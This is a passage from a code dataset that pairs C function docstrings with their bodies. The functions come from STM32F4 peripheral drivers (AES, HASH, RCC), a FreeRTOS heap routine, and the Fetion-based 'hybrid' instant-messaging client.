Wait until the complete message has been processed */\n    counter = 0;\n    do\n    {\n      busystatus = CRYP_GetFlagStatus(CRYP_FLAG_BUSY);\n      counter++;\n    }while ((counter != AESBUSY_TIMEOUT) && (busystatus != RESET));\n\n    if (busystatus != RESET)\n   {\n       status = ERROR;\n    }\n    else\n    {\n\n      /* Read the Output block from the Output FIFO */\n      *(uint32_t*)(outputaddr) = CRYP_DataOut();\n      outputaddr+=4;\n      *(uint32_t*)(outputaddr) = CRYP_DataOut();\n      outputaddr+=4;\n      *(uint32_t*)(outputaddr) = CRYP_DataOut();\n      outputaddr+=4;\n      *(uint32_t*)(outputaddr) = CRYP_DataOut();\n      outputaddr+=4;\n    }\n  }\n\n  /* Disable Crypto */\n  CRYP_Cmd(DISABLE);\n\n  return status;\n}", "path": "STM32F4 Discovery Software Examples\\STM32F4xx_uCOSII_Example\\CPU\\ST\\STM32\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_cryp_aes.c", "repo_name": "mfauzi/STM32F4", "stars": 99, "license": "None", "language": "c", "size": 67520}
{"docstring": "/**\n  * @brief  Clears the HASH interrupt pending bit(s).\n  * @param  HASH_IT: specifies the HASH interrupt pending bit(s) to clear.\n  *          This parameter can be any combination of the following values:\n  *            @arg HASH_IT_DINI: Data Input interrupt\n  *            @arg HASH_IT_DCI: Digest Calculation Completion Interrupt\n  * @retval None\n  */\n", "func_signal": "void HASH_ClearITPendingBit(uint8_t HASH_IT)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_HASH_IT(HASH_IT));\n\n  /* Clear the selected HASH interrupt pending bit */\n  HASH->SR = (uint8_t)~HASH_IT;\n}", "path": "STM32F4 Discovery Software Examples\\STM32F4xx_USB_Example\\Libraries\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_hash.c", "repo_name": "mfauzi/STM32F4", "stars": 99, "license": "None", "language": "c", "size": 67520}
{"docstring": "/**\n  * @brief  Enables or disables the AHB2 peripheral clock.\n  * @note   After reset, the peripheral clock (used for registers read/write access)\n  *         is disabled and the application software has to enable this clock before \n  *         using it. \n  * @param  RCC_AHBPeriph: specifies the AHB2 peripheral to gates its clock.\n  *          This parameter can be any combination of the following values:\n  *            @arg RCC_AHB2Periph_DCMI:   DCMI clock\n  *            @arg RCC_AHB2Periph_CRYP:   CRYP clock\n  *            @arg RCC_AHB2Periph_HASH:   HASH clock\n  *            @arg RCC_AHB2Periph_RNG:    RNG clock\n  *            @arg RCC_AHB2Periph_OTG_FS: USB OTG FS clock\n  * @param  NewState: new state of the specified peripheral clock.\n  *          This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void RCC_AHB2PeriphClockCmd(uint32_t RCC_AHB2Periph, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_RCC_AHB2_PERIPH(RCC_AHB2Periph));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n\n  if (NewState != DISABLE)\n  {\n    RCC->AHB2ENR |= RCC_AHB2Periph;\n  }\n  else\n  {\n    RCC->AHB2ENR &= ~RCC_AHB2Periph;\n  }\n}", "path": "MyFlow\\Test2-USART\\cmsis_lib\\source\\stm32f4xx_rcc.c", "repo_name": "mfauzi/STM32F4", "stars": 99, "license": "None", "language": "c", "size": 67520}
{"docstring": "/**\n  * @brief  Encrypt and decrypt using AES in CTR Mode\n  * @param  Mode: encryption or decryption Mode.\n  *           This parameter can be one of the following values:\n  *            @arg MODE_ENCRYPT: Encryption\n  *            @arg MODE_DECRYPT: Decryption\n  * @param  InitVectors: Initialisation Vectors used for AES algorithm.\n  * @param  Key: Key used for AES algorithm.\n  * @param  Keysize: length of the Key, must be a 128, 192 or 256.\n  * @param  Input: pointer to the Input buffer.\n  * @param  Ilength: length of the Input buffer, must be a multiple of 16.\n  * @param  Output: pointer to the returned buffer.\n  * @retval An ErrorStatus enumeration value:\n  *          - SUCCESS: Operation done\n  *          - ERROR: Operation failed\n  */\n", "func_signal": "ErrorStatus CRYP_AES_CTR(uint8_t Mode, uint8_t InitVectors[16], uint8_t *Key, \n                         uint16_t Keysize, uint8_t *Input, uint32_t Ilength,\n                         uint8_t *Output)", "code": "{\n  CRYP_InitTypeDef AES_CRYP_InitStructure;\n  CRYP_KeyInitTypeDef AES_CRYP_KeyInitStructure;\n  CRYP_IVInitTypeDef AES_CRYP_IVInitStructure;\n  __IO uint32_t counter = 0;\n  uint32_t busystatus = 0;\n  ErrorStatus status = SUCCESS;\n  uint32_t keyaddr    = (uint32_t)Key;\n  uint32_t inputaddr  = (uint32_t)Input;\n  uint32_t outputaddr = (uint32_t)Output;\n  uint32_t ivaddr     = (uint32_t)InitVectors;\n  uint32_t i = 0;\n\n  /* Crypto structures initialisation*/\n  CRYP_KeyStructInit(&AES_CRYP_KeyInitStructure);\n\n  switch(Keysize)\n  {\n    case 128:\n    AES_CRYP_InitStructure.CRYP_KeySize = CRYP_KeySize_128b;\n    AES_CRYP_KeyInitStructure.CRYP_Key2Left = __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key2Right= __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key3Left = __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key3Right= __REV(*(uint32_t*)(keyaddr));\n    break;\n    case 192:\n    AES_CRYP_InitStructure.CRYP_KeySize  = CRYP_KeySize_192b;\n    AES_CRYP_KeyInitStructure.CRYP_Key1Left = __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key1Right= __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key2Left = __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key2Right= __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key3Left = __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key3Right= __REV(*(uint32_t*)(keyaddr));\n    break;\n    case 256:\n    AES_CRYP_InitStructure.CRYP_KeySize  = CRYP_KeySize_256b;\n    AES_CRYP_KeyInitStructure.CRYP_Key0Left = __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key0Right= __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key1Left = __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key1Right= __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key2Left = __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key2Right= __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key3Left = __REV(*(uint32_t*)(keyaddr));\n    keyaddr+=4;\n    AES_CRYP_KeyInitStructure.CRYP_Key3Right= __REV(*(uint32_t*)(keyaddr));\n    break;\n    default:\n    break;\n  }\n  /* CRYP Initialization Vectors */\n  AES_CRYP_IVInitStructure.CRYP_IV0Left = __REV(*(uint32_t*)(ivaddr));\n  ivaddr+=4;\n  AES_CRYP_IVInitStructure.CRYP_IV0Right= __REV(*(uint32_t*)(ivaddr));\n  ivaddr+=4;\n  AES_CRYP_IVInitStructure.CRYP_IV1Left = __REV(*(uint32_t*)(ivaddr));\n  ivaddr+=4;\n  AES_CRYP_IVInitStructure.CRYP_IV1Right= __REV(*(uint32_t*)(ivaddr));\n\n  /* Key Initialisation */\n  CRYP_KeyInit(&AES_CRYP_KeyInitStructure);\n\n  /*------------------ AES Decryption ------------------*/\n  if(Mode == MODE_DECRYPT) /* AES decryption */\n  {\n    /* Crypto Init for decryption process */\n    AES_CRYP_InitStructure.CRYP_AlgoDir = CRYP_AlgoDir_Decrypt;\n  }\n  /*------------------ AES Encryption ------------------*/\n  else /* AES encryption */\n  {\n    /* Crypto Init for Encryption process */\n    AES_CRYP_InitStructure.CRYP_AlgoDir = CRYP_AlgoDir_Encrypt;\n  }\n  AES_CRYP_InitStructure.CRYP_AlgoMode = CRYP_AlgoMode_AES_CTR;\n  AES_CRYP_InitStructure.CRYP_DataType = CRYP_DataType_8b;\n  CRYP_Init(&AES_CRYP_InitStructure);\n\n  /* CRYP Initialization Vectors */\n  CRYP_IVInit(&AES_CRYP_IVInitStructure);\n\n  /* Flush IN/OUT FIFOs */\n  CRYP_FIFOFlush();\n\n  /* Enable Crypto processor */\n  CRYP_Cmd(ENABLE);\n\n  for(i=0; ((i<Ilength) && (status != ERROR)); i+=16)\n  {\n\n    /* Write the Input block in the IN FIFO */\n    CRYP_DataIn(*(uint32_t*)(inputaddr));\n    inputaddr+=4;\n    CRYP_DataIn(*(uint32_t*)(inputaddr));\n    inputaddr+=4;\n    CRYP_DataIn(*(uint32_t*)(inputaddr));\n    inputaddr+=4;\n    CRYP_DataIn(*(uint32_t*)(inputaddr));\n    inputaddr+=4;\n    /* Wait until the complete message has been processed */\n    counter = 0;\n    do\n    {\n      busystatus = CRYP_GetFlagStatus(CRYP_FLAG_BUSY);\n      counter++;\n    }while ((counter != AESBUSY_TIMEOUT) && (busystatus != RESET));\n\n    if (busystatus != RESET)\n   {\n       status = ERROR;\n    }\n    else\n    {\n\n      /* Read the Output block from the Output FIFO */\n      *(uint32_t*)(outputaddr) = CRYP_DataOut();\n      outputaddr+=4;\n      *(uint32_t*)(outputaddr) = CRYP_DataOut();\n      outputaddr+=4;\n      *(uint32_t*)(outputaddr) = CRYP_DataOut();\n      outputaddr+=4;\n      *(uint32_t*)(outputaddr) = CRYP_DataOut();\n      outputaddr+=4;\n    }\n  }\n  /* Disable Crypto */\n  CRYP_Cmd(DISABLE);\n\n  return status;\n}", "path": "STM32F4 Discovery Software Examples\\STM32F4xx_uCOSII_Example\\CPU\\ST\\STM32\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_cryp_aes.c", "repo_name": "mfauzi/STM32F4", "stars": 99, "license": "None", "language": "c", "size": 67520}
{"docstring": "/**\n  * @brief  Enables or disables the RTC clock.\n  * @note   This function must be used only after the RTC clock source was selected\n  *         using the RCC_RTCCLKConfig function.\n  * @param  NewState: new state of the RTC clock. This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void RCC_RTCCLKCmd(FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n\n  *(__IO uint32_t *) BDCR_RTCEN_BB = (uint32_t)NewState;\n}", "path": "MyFlow\\Test2-USART\\cmsis_lib\\source\\stm32f4xx_rcc.c", "repo_name": "mfauzi/STM32F4", "stars": 99, "license": "None", "language": "c", "size": 67520}
{"docstring": "/**\n  * @brief  Forces or releases the Backup domain reset.\n  * @note   This function resets the RTC peripheral (including the backup registers)\n  *         and the RTC clock source selection in RCC_CSR register.\n  * @note   The BKPSRAM is not affected by this reset.    \n  * @param  NewState: new state of the Backup domain reset.\n  *          This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void RCC_BackupResetCmd(FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n  *(__IO uint32_t *) BDCR_BDRST_BB = (uint32_t)NewState;\n}", "path": "MyFlow\\Test2-USART\\cmsis_lib\\source\\stm32f4xx_rcc.c", "repo_name": "mfauzi/STM32F4", "stars": 99, "license": "None", "language": "c", "size": 67520}
{"docstring": "/**\n  * @brief  Restore the Hash peripheral Context.  \n  * @note   After calling this function, user can restart the processing from the\n  *         point where it has been interrupted.  \n  * @param  HASH_ContextRestore: pointer to a HASH_Context structure that contains\n  *         the repository for saved context.\n  * @retval None\n  */\n", "func_signal": "void HASH_RestoreContext(HASH_Context* HASH_ContextRestore)", "code": "{\n  uint8_t i = 0;\n  \n  /* restore context registers */\n  HASH->IMR = HASH_ContextRestore->HASH_IMR;   \n  HASH->STR = HASH_ContextRestore->HASH_STR;     \n  HASH->CR = HASH_ContextRestore->HASH_CR;\n  \n  /* Initialize the hash processor */\n  HASH->CR |= HASH_CR_INIT; \n  \n   /* continue restoring context registers */     \n  for(i=0; i<=50;i++)\n  {\n     HASH->CSR[i] = HASH_ContextRestore->HASH_CSR[i];\n  }   \n}", "path": "STM32F4 Discovery Software Examples\\STM32F4xx_USB_Example\\Libraries\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_hash.c", "repo_name": "mfauzi/STM32F4", "stars": 99, "license": "None", "language": "c", "size": 67520}
{"docstring": "/**\n  * @brief  Forces or releases AHB2 peripheral reset.\n  * @param  RCC_AHB2Periph: specifies the AHB2 peripheral to reset.\n  *          This parameter can be any combination of the following values:\n  *            @arg RCC_AHB2Periph_DCMI:   DCMI clock\n  *            @arg RCC_AHB2Periph_CRYP:   CRYP clock\n  *            @arg RCC_AHB2Periph_HASH:   HASH clock\n  *            @arg RCC_AHB2Periph_RNG:    RNG clock\n  *            @arg RCC_AHB2Periph_OTG_FS: USB OTG FS clock\n  * @param  NewState: new state of the specified peripheral reset.\n  *          This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void RCC_AHB2PeriphResetCmd(uint32_t RCC_AHB2Periph, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_RCC_AHB2_PERIPH(RCC_AHB2Periph));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n\n  if (NewState != DISABLE)\n  {\n    RCC->AHB2RSTR |= RCC_AHB2Periph;\n  }\n  else\n  {\n    RCC->AHB2RSTR &= ~RCC_AHB2Periph;\n  }\n}", "path": "MyFlow\\Test2-USART\\cmsis_lib\\source\\stm32f4xx_rcc.c", "repo_name": "mfauzi/STM32F4", "stars": 99, "license": "None", "language": "c", "size": 67520}
{"docstring": "/**\n  * @brief  Configures the Low Speed APB clock (PCLK1).\n  * @param  RCC_HCLK: defines the APB1 clock divider. This clock is derived from \n  *         the AHB clock (HCLK).\n  *          This parameter can be one of the following values:\n  *            @arg RCC_HCLK_Div1:  APB1 clock = HCLK\n  *            @arg RCC_HCLK_Div2:  APB1 clock = HCLK/2\n  *            @arg RCC_HCLK_Div4:  APB1 clock = HCLK/4\n  *            @arg RCC_HCLK_Div8:  APB1 clock = HCLK/8\n  *            @arg RCC_HCLK_Div16: APB1 clock = HCLK/16\n  * @retval None\n  */\n", "func_signal": "void RCC_PCLK1Config(uint32_t RCC_HCLK)", "code": "{\n  uint32_t tmpreg = 0;\n\n  /* Check the parameters */\n  assert_param(IS_RCC_PCLK(RCC_HCLK));\n\n  tmpreg = RCC->CFGR;\n\n  /* Clear PPRE1[2:0] bits */\n  tmpreg &= ~RCC_CFGR_PPRE1;\n\n  /* Set PPRE1[2:0] bits according to RCC_HCLK value */\n  tmpreg |= RCC_HCLK;\n\n  /* Store the new value */\n  RCC->CFGR = tmpreg;\n}", "path": "MyFlow\\Test2-USART\\cmsis_lib\\source\\stm32f4xx_rcc.c", "repo_name": "mfauzi/STM32F4", "stars": 99, "license": "None", "language": "c", "size": 67520}
{"docstring": "/**\n  * @brief  Clears the RCC's interrupt pending bits.\n  * @param  RCC_IT: specifies the interrupt pending bit to clear.\n  *          This parameter can be any combination of the following values:\n  *            @arg RCC_IT_LSIRDY: LSI ready interrupt\n  *            @arg RCC_IT_LSERDY: LSE ready interrupt\n  *            @arg RCC_IT_HSIRDY: HSI ready interrupt\n  *            @arg RCC_IT_HSERDY: HSE ready interrupt\n  *            @arg RCC_IT_PLLRDY: main PLL ready interrupt\n  *            @arg RCC_IT_PLLI2SRDY: PLLI2S ready interrupt  \n  *            @arg RCC_IT_CSS: Clock Security System interrupt\n  * @retval None\n  */\n", "func_signal": "void RCC_ClearITPendingBit(uint8_t RCC_IT)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_RCC_CLEAR_IT(RCC_IT));\n\n  /* Perform Byte access to RCC_CIR[23:16] bits to clear the selected interrupt\n     pending bits */\n  *(__IO uint8_t *) CIR_BYTE3_ADDRESS = RCC_IT;\n}", "path": "MyFlow\\Test2-USART\\cmsis_lib\\source\\stm32f4xx_rcc.c", "repo_name": "mfauzi/STM32F4", "stars": 99, "license": "None", "language": "c", "size": 67520}
{"docstring": "/**\n  * @brief  Configures the High Speed APB clock (PCLK2).\n  * @param  RCC_HCLK: defines the APB2 clock divider. This clock is derived from \n  *         the AHB clock (HCLK).\n  *          This parameter can be one of the following values:\n  *            @arg RCC_HCLK_Div1:  APB2 clock = HCLK\n  *            @arg RCC_HCLK_Div2:  APB2 clock = HCLK/2\n  *            @arg RCC_HCLK_Div4:  APB2 clock = HCLK/4\n  *            @arg RCC_HCLK_Div8:  APB2 clock = HCLK/8\n  *            @arg RCC_HCLK_Div16: APB2 clock = HCLK/16\n  * @retval None\n  */\n", "func_signal": "void RCC_PCLK2Config(uint32_t RCC_HCLK)", "code": "{\n  uint32_t tmpreg = 0;\n\n  /* Check the parameters */\n  assert_param(IS_RCC_PCLK(RCC_HCLK));\n\n  tmpreg = RCC->CFGR;\n\n  /* Clear PPRE2[2:0] bits */\n  tmpreg &= ~RCC_CFGR_PPRE2;\n\n  /* Set PPRE2[2:0] bits according to RCC_HCLK value */\n  tmpreg |= RCC_HCLK << 3;\n\n  /* Store the new value */\n  RCC->CFGR = tmpreg;\n}", "path": "MyFlow\\Test2-USART\\cmsis_lib\\source\\stm32f4xx_rcc.c", "repo_name": "mfauzi/STM32F4", "stars": 99, "license": "None", "language": "c", "size": 67520}
{"docstring": "/**\n  * @brief  Checks whether the specified HASH flag is set or not.\n  * @param  HASH_FLAG: specifies the HASH flag to check.\n  *          This parameter can be one of the following values:\n  *            @arg HASH_FLAG_DINIS: Data input interrupt status flag\n  *            @arg HASH_FLAG_DCIS: Digest calculation completion interrupt status flag\n  *            @arg HASH_FLAG_BUSY: Busy flag\n  *            @arg HASH_FLAG_DMAS: DMAS Status flag\n  *            @arg HASH_FLAG_DINNE: Data Input register (DIN) not empty status flag\n  * @retval The new state of HASH_FLAG (SET or RESET)\n  */\n", "func_signal": "FlagStatus HASH_GetFlagStatus(uint16_t HASH_FLAG)", "code": "{\n  FlagStatus bitstatus = RESET;\n  uint32_t tempreg = 0;\n\n  /* Check the parameters */\n  assert_param(IS_HASH_GET_FLAG(HASH_FLAG));\n\n  /* check if the FLAG is in CR register */\n  if ((HASH_FLAG & HASH_FLAG_DINNE) != (uint16_t)RESET ) \n  {\n    tempreg = HASH->CR;\n  }\n  else /* The FLAG is in SR register */\n  {\n    tempreg = HASH->SR;\n  }\n\n  /* Check the status of the specified HASH flag */\n  if ((tempreg & HASH_FLAG) != (uint16_t)RESET)\n  {\n    /* HASH is set */\n    bitstatus = SET;\n  }\n  else\n  {\n    /* HASH_FLAG is reset */\n    bitstatus = RESET;\n  }\n\n  /* Return the HASH_FLAG status */\n  return  bitstatus;\n}", "path": "STM32F4 Discovery Software Examples\\STM32F4xx_USB_Example\\Libraries\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_hash.c", "repo_name": "mfauzi/STM32F4", "stars": 99, "license": "None", "language": "c", "size": 67520}
{"docstring": "/**\n  * @brief  Enables or disables the Clock Security System.\n  * @note   If a failure is detected on the HSE oscillator clock, this oscillator\n  *         is automatically disabled and an interrupt is generated to inform the\n  *         software about the failure (Clock Security System Interrupt, CSSI),\n  *         allowing the MCU to perform rescue operations. The CSSI is linked to \n  *         the Cortex-M4 NMI (Non-Maskable Interrupt) exception vector.  \n  * @param  NewState: new state of the Clock Security System.\n  *         This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void RCC_ClockSecuritySystemCmd(FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n  *(__IO uint32_t *) CR_CSSON_BB = (uint32_t)NewState;\n}", "path": "MyFlow\\Test2-USART\\cmsis_lib\\source\\stm32f4xx_rcc.c", "repo_name": "mfauzi/STM32F4", "stars": 99, "license": "None", "language": "c", "size": 67520}
{"docstring": "/**\n  * @brief  Enables or disables the main PLL.\n  * @note   After enabling the main PLL, the application software should wait on \n  *         PLLRDY flag to be set indicating that PLL clock is stable and can\n  *         be used as system clock source.\n  * @note   The main PLL can not be disabled if it is used as system clock source\n  * @note   The main PLL is disabled by hardware when entering STOP and STANDBY modes.\n  * @param  NewState: new state of the main PLL. This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void RCC_PLLCmd(FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n  *(__IO uint32_t *) CR_PLLON_BB = (uint32_t)NewState;\n}", "path": "MyFlow\\Test2-USART\\cmsis_lib\\source\\stm32f4xx_rcc.c", "repo_name": "mfauzi/STM32F4", "stars": 99, "license": "None", "language": "c", "size": 67520}
{"docstring": "/**\n  * @brief  Enables or disables the AHB3 peripheral clock.\n  * @note   After reset, the peripheral clock (used for registers read/write access)\n  *         is disabled and the application software has to enable this clock before \n  *         using it. \n  * @param  RCC_AHBPeriph: specifies the AHB3 peripheral to gates its clock.\n  *          This parameter must be: RCC_AHB3Periph_FSMC\n  * @param  NewState: new state of the specified peripheral clock.\n  *          This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void RCC_AHB3PeriphClockCmd(uint32_t RCC_AHB3Periph, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_RCC_AHB3_PERIPH(RCC_AHB3Periph));  \n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n\n  if (NewState != DISABLE)\n  {\n    RCC->AHB3ENR |= RCC_AHB3Periph;\n  }\n  else\n  {\n    RCC->AHB3ENR &= ~RCC_AHB3Periph;\n  }\n}", "path": "MyFlow\\Test2-USART\\cmsis_lib\\source\\stm32f4xx_rcc.c", "repo_name": "mfauzi/STM32F4", "stars": 99, "license": "None", "language": "c", "size": 67520}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "void vPortFree( void *pv )", "code": "{\nunsigned char *puc = ( unsigned char * ) pv;\nxBlockLink *pxLink;\n\n\tif( pv )\n\t{\n\t\t/* The memory being freed will have an xBlockLink structure immediately\n\t\tbefore it. */\n\t\tpuc -= heapSTRUCT_SIZE;\n\n\t\t/* This casting is to keep the compiler from issuing warnings. */\n\t\tpxLink = ( void * ) puc;\n\n\t\tvTaskSuspendAll();\n\t\t{\n\t\t\t/* Add this block to the list of free blocks. */\n\t\t\tprvInsertBlockIntoFreeList( ( ( xBlockLink * ) pxLink ) );\n\t\t\txFreeBytesRemaining += pxLink->xBlockSize;\n\t\t}\n\t\txTaskResumeAll();\n\t}\n}", "path": "STM32F4 Discovery Software Examples\\STM32F4xx_Ethernet_Example\\Utilities\\FreeRTOS_v6.1.0\\portable\\MemMang\\heap_2.c", "repo_name": "mfauzi/STM32F4", "stars": 99, "license": "None", "language": "c", "size": 67520}
{"docstring": "/**\n * Callback function to handle the invite-connect event, when we\n * get this acknowledge message, we should start to invite the buddy\n * to the conversation.\n *\n * The message received is:\n *\n * SIP-C/4.0 200 OK\n * I: 5\n * Q: 2 R\n * XI: 3d2ef745db9741a8946a57c40b0eb4d5\n * X: 1200\n * K: text/plain\n * K: text/html-fragment\n * K: multiparty\n * K: nudge\n *\n * then we send out invite-buddy request:\n */\n", "func_signal": "static gint\nchat_reg_cb(fetion_account *account, const gchar *sipmsg,\n            fetion_transaction *trans)", "code": "{\n    fetion_sip         *sip;\n    sip_header         *eheader;\n    gchar              *body;\n    gchar              *sip_text;\n    fetion_transaction *new_trans;\n    fetion_buddy       *buddy;\n\n    sip = account->sip;\n\n    fetion_sip_set_type(sip, SIP_SERVICE);\n\n    if (!(buddy = fetion_buddy_find_by_userid(account, trans->userid))) {\n\n        hybrid_debug_error(\"fetion\", \"invite new buddy failed\");\n\n        return HYBRID_ERROR;\n    }\n\n    eheader = sip_event_header_create(SIP_EVENT_INVITEBUDDY);\n    fetion_sip_add_header(sip, eheader);\n\n    body = generate_invite_buddy_body(buddy->sipuri);\n\n    new_trans = transaction_clone(trans);\n    transaction_set_callid(new_trans, sip->callid);\n    transaction_set_callback(new_trans, invite_buddy_cb);\n    transaction_add(account, new_trans);\n\n    sip_text = fetion_sip_to_string(sip, body);\n    g_free(body);\n\n    hybrid_debug_info(\"fetion\", \"invite new buddy,send:\\n%s\", sip_text);\n\n    if (send(account->sk, sip_text, strlen(sip_text), 0) == -1) {\n\n        hybrid_debug_error(\"fetion\", \"invite new buddy failed\");\n\n        return HYBRID_ERROR;\n    }\n\n    g_free(sip_text);\n\n    return HYBRID_OK;\n}", "path": "modules\\fetion\\fx_msg.c", "repo_name": "levin108/hybrid", "stars": 110, "license": "gpl-2.0", "language": "c", "size": 1092}
{"docstring": "/**\n * Hide the edit box and show the info panel.\n */\n", "func_signal": "static void\nhide_edit_box(void)", "code": "{\n    gtk_widget_show(hybrid_head->eventbox);\n    gtk_widget_hide(hybrid_head->editbox);\n}", "path": "src\\head.c", "repo_name": "levin108/hybrid", "stars": 110, "license": "gpl-2.0", "language": "c", "size": 1092}
{"docstring": "/**\n * Initialize the basic settings page.\n */\n", "func_signal": "void\npref_basic_init(GtkWidget *tab)", "code": "{\n    GtkWidget *section;\n    int i, j;\n    section = hybrid_pref_tab_add_section(tab, _(\"Main Window\"));\n    hybrid_pref_section_add_entry(main_pref_window, section, PREF_KEY_BOOL,\n                                  _(\"Quit when main window is closed.\"),\n                                  \"quit_when_close\",\n                                  _(\"Quit when main window is closed.\"), NULL);\n\n    section = hybrid_pref_tab_add_section(tab, _(\"Chat Window\"));\n    hybrid_pref_section_add_entry(main_pref_window, section, PREF_KEY_BOOL,\n                                  _(\"Hide Action Buttons\"), \"hide_chat_buttons\",\n                                  _(\"Hide Action Buttons\"), NULL);\n\n    HybridChatTheme *themes = hybrid_chat_window_get_themes();\n\n    for (i = 0;themes[i].name;i++);\n\n    SelectOption *options = g_new0(SelectOption, i+1);\n\n    for (j = 0;j < i;j++) {\n        options[j].name = options[j].value.str = themes[j].name;\n    }\n\n    hybrid_pref_section_add_entry(main_pref_window, section, PREF_KEY_SELECT,\n                                  _(\"Chat Theme:\"), \"chat_theme\",\n                                  _(\"Chat Theme:\"), options);\n    g_free(options);\n\n    /* section = hybrid_pref_tab_add_section(tab, _(\"Tabs\")); */\n    hybrid_pref_section_add_entry(\n        main_pref_window, section, PREF_KEY_BOOL,\n        _(\"Show Messages In A Single Window With Tabs\"), \"single_chat_window\",\n        _(\"Show Messages In A Single Window With Tabs\"), NULL);\n\n    SelectOption pos_options[] = {\n        {\n            .name = _(\"Top\"),\n            .value.num = GTK_POS_TOP\n        }, {\n            .name = _(\"Right\"),\n            .value.num = GTK_POS_RIGHT\n        }, {\n            .name = _(\"Bottom\"),\n            .value.num = GTK_POS_BOTTOM\n        }, {\n            .name = _(\"Left\"),\n            .value.num = GTK_POS_LEFT\n        }, {\n            .name = NULL\n        }\n    };\n    hybrid_pref_section_add_entry(main_pref_window, section, PREF_KEY_ENUM,\n                                  _(\"Tab Position:\"), \"tab_pos\",\n                                  _(\"Tab Position:\"), &pos_options);\n}", "path": "src\\preference.c", "repo_name": "levin108/hybrid", "stars": 110, "license": "gpl-2.0", "language": "c", "size": 1092}
{"docstring": "/**\n * Callback function to handle the portrait receive event.\n */\n", "func_signal": "static gboolean\nportrait_recv_cb(gint sk, gpointer user_data)", "code": "{\n    gchar           buf[BUF_LENGTH];\n    gint            n;\n    gchar          *pos;\n    HybridBuddy    *imbuddy;\n    portrait_trans *trans = (portrait_trans*)user_data;\n\n    if ((n = recv(sk, buf, sizeof(buf), 0)) == -1) {\n        hybrid_debug_error(\"fetion\", \"get portrait for \\'%s\\':%s\",\n                trans->buddy ? trans->buddy->sid : trans->ac->sid,\n                strerror(errno));\n        return FALSE;\n    }\n\n    buf[n] = '\\0';\n\n    if (n == 0) {\n\n        if (trans->portrait_type == PORTRAIT_TYPE_BUDDY) {\n            imbuddy = hybrid_blist_find_buddy(trans->ac->account,\n                    trans->buddy->userid);\n        }\n\n        if (hybrid_get_http_code(trans->data) != 200) {\n            /*\n             * Note that we got no portrait, but we still need\n             * to set buddy icon, just for the portrait checksum, we\n             * set it default to \"0\" instead of leaving it NULL,\n             * so that in the next login, we just check the changes\n             * of the buddy's checksum to determine whether to fetch a\n             * portrait from the server.\n             */\n            if (trans->portrait_type == PORTRAIT_TYPE_BUDDY) {\n                hybrid_blist_set_buddy_icon(imbuddy, NULL, 0,\n                        trans->buddy->portrait_crc);\n\n            } else {\n                hybrid_account_set_icon(trans->ac->account, NULL,\n                        0, trans->ac->portrait_crc);\n            }\n\n            goto pt_fin;\n        }\n\n        trans->data_len = hybrid_get_http_length(trans->data);\n\n        if (!(pos = strstr(trans->data, \"\\r\\n\\r\\n\"))) {\n            goto pt_fin;\n        }\n\n        pos += 4;\n\n        if (trans->portrait_type == PORTRAIT_TYPE_BUDDY) { /**< buddy portrait */\n            hybrid_blist_set_buddy_icon(imbuddy, (guchar*)pos,\n                    trans->data_len, trans->buddy->portrait_crc);\n\n        } else {\n            hybrid_account_set_icon(trans->ac->account, (guchar*)pos,\n                    trans->data_len, trans->ac->portrait_crc);\n        }\n\n        goto pt_fin;\n\n    } else {\n        trans->data = realloc(trans->data, trans->data_size + n);\n        memcpy(trans->data + 